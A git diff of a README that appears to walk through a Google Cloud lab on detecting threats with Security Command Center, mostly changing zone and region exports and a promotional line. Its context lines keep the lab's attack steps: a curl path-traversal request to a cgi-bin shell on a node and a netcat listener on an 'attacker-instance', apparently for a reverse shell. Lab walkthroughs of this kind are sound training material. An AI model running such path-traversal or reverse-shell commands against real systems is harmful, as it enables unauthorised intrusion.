@@ -1,7 +1,7 @@
 
 # Detect and Investigate Threats with Security Command Center [GSP1125]
 
-# If you consider that the video helped you to complete your lab, so please do like and subscribe [Techcps](https://www.youtube.com/@techcps)
+## Please like share & subscribe to [Techcps](https://www.youtube.com/@techcps) & join our [WhatsApp Channel](https://whatsapp.com/channel/0029Va9nne147XeIFkXYv71A)
 
 ## Note: Go to "IAM & Admin" > "Audit Logs".
 * Click the findbar and type: "Cloud Resource Manager API"
@@ -11,9 +11,10 @@
 ## In the GCP Console open the Cloud Shell and enter the following commands:
 
 ```
-export ZONE=us-central1-c
-REGION=${ZONE::-2}
-
+export ZONE=
+```
+```
+export REGION=${ZONE%-*}
 gcloud services enable securitycenter.googleapis.com --project=$DEVSHELL_PROJECT_ID
 sleep 30
 
@@ -41,7 +42,6 @@ gcloud compute ssh instance-1 --zone=$ZONE --tunnel-through-iap --project "$DEVS
 ## Note: Check the progress on task 1 & 2
 * Do not move until you get score on tast 1 & 2
 
-
 ```
 gcloud compute instances delete instance-1 --zone=$ZONE --quiet
 
@@ -66,10 +66,10 @@ gcloud compute ssh --zone "$ZONE" "attacker-instance" --quiet
 ```
 TASK_5_IP_ADDRESS=
 ```
-
 ```
-export ZONE=us-central1-c
-
+export ZONE=
+```
+```
 sudo snap remove google-cloud-cli
 
 curl -O https://dl.google.com/dl/cloudsdk/channels/rapid/downloads/google-cloud-cli-438.0.0-linux-x86_64.tar.gz
@@ -182,7 +182,9 @@ curl "http://${NODE_IP}:${NODE_PORT}/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"
 ## Note: Open the new terminal
 
 ```
-export ZONE=us-central1-c
+export ZONE=
+```
+```
 gcloud compute ssh --zone "$ZONE" "attacker-instance" --quiet --command "nc -nlvp 8888"
 ```
 
